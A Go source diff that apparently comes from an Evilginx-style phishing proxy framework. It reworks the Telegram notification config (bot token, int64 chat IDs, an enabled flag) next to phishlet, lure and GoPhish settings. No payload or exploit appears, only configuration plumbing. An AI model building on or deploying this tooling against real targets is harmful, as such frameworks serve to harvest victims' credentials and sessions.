@@ -64,11 +64,12 @@ type GoPhishConfig struct {
 	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
 	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
 }
-type TelegramConfig struct {
-	BotToken string   `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
-	ChatIDs  []string `mapstructure:"chat_ids" json:"chat_ids" yaml:"chat_ids"`
-}
 
+type TelegramCfg struct {
+	BotToken string   `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
+	ChatIDs  []int64  `mapstructure:"chat_ids" json:"chat_ids" yaml:"chat_ids"`
+	Enabled bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+}
 
 type GeneralConfig struct {
 	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
@@ -82,11 +83,11 @@ type GeneralConfig struct {
 }
 
 type Config struct {
-	general         *GeneralConfig
+	general          *GeneralConfig
 	certificates    *CertificatesConfig
 	blacklistConfig *BlacklistConfig
 	gophishConfig   *GoPhishConfig
-	telegramConfig  *TelegramConfig
+	telegramConfig  *TelegramCfg
 	proxyConfig     *ProxyConfig
 	phishletConfig  map[string]*PhishletConfig
 	phishlets       map[string]*Phishlet
@@ -108,19 +109,18 @@ const (
 	CFG_BLACKLIST    = "blacklist"
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
-	CFG_TELEGRAM     = "telegram"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
-		general:         &GeneralConfig{},
-		certificates:    &CertificatesConfig{},
-		gophishConfig:   &GoPhishConfig{},
-		telegramConfig:  &TelegramConfig{},
+		general:          &GeneralConfig{},
+		certificates:     &CertificatesConfig{},
+		gophishConfig:    &GoPhishConfig{},
+		telegramConfig:   &TelegramCfg{},
 		phishletConfig:  make(map[string]*PhishletConfig),
-		phishlets:       make(map[string]*Phishlet),
+		phishlets:        make(map[string]*Phishlet),
 		phishletNames:   []string{},
 		lures:           []*Lure{},
 		blacklistConfig: &BlacklistConfig{},
@@ -160,8 +160,6 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
-
-	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)
 
 	if c.general.OldIpv4 != "" {
 		if c.general.ExternalIpv4 == "" {
@@ -389,33 +387,6 @@ func (c *Config) SetGoPhishInsecureTLS(k bool) {
 	log.Info("gophish insecure set to: %v", k)
 	c.cfg.WriteConfig()
 }
-func (c *Config) SetTelegramBotToken(token string) {
-	c.telegramConfig.BotToken = token
-	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
-	log.Info("telegram bot token set to: %s", token)
-	c.cfg.WriteConfig()
-}
-
-func (c *Config) SetTelegramChatIDs(chatIDs []string) {
-	c.telegramConfig.ChatIDs = chatIDs
-	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
-	log.Info("telegram chat ids set to: %v", chatIDs)
-	c.cfg.WriteConfig()
-}
-
-func (c *Config) AppendTelegramChatID(chatID string) {
-	for _, id := range c.telegramConfig.ChatIDs {
-		if id == chatID {
-			log.Info("telegram chat id already exists: %s", chatID)
-			return
-		}
-	}
-	c.telegramConfig.ChatIDs = append(c.telegramConfig.ChatIDs, chatID)
-	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
-	log.Info("telegram chat id appended: %s", chatID)
-	c.cfg.WriteConfig()
-}
-
 
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
@@ -860,11 +831,36 @@ func (c *Config) GetGoPhishApiKey() string {
 func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
 }
+
+func (c *Config) SetTelegramBotToken(k string) {
+	c.telegramConfig.BotToken = k
+	c.cfg.Set("telegram", c.telegramConfig)
+	log.Info("telegram bot token set")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTelegramChatIDs(chatIDs []int64) {
+	c.telegramConfig.ChatIDs = chatIDs
+	c.cfg.Set("telegram", c.telegramConfig)
+	log.Info("telegram chat ids set to: %v", chatIDs)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTelegramEnabled(enabled bool) {
+	c.telegramConfig.Enabled = enabled
+	c.cfg.Set("telegram", c.telegramConfig)
+	log.Info("telegram enabled set to: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
 func (c *Config) GetTelegramBotToken() string {
 	return c.telegramConfig.BotToken
 }
 
-func (c *Config) GetTelegramChatIDs() []string {
+func (c *Config) GetTelegramChatIDs() []int64 {
 	return c.telegramConfig.ChatIDs
 }
 
+func (c *Config) GetTelegramEnabled() bool {
+	return c.telegramConfig.Enabled
+}
